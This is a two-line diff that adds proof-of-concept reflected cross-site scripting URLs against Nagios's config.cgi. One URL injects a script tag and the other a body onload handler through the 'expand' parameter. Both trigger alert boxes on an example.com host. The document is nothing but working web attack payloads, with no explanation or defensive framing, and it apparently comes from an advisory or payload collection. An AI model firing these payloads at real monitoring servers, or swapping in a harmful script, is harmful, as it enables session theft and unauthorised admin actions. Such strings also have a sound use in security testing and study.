@@ -1,0 +1,2 @@
+http://www.example.com/nagios/cgi-bin/config.cgi?type=command&expand=<script>alert(String.fromCharCode(88,83,83))</script>
+http://www.example.com/nagios/cgi-bin/config.cgi?type=command&expand=<body onload=alert(666)>
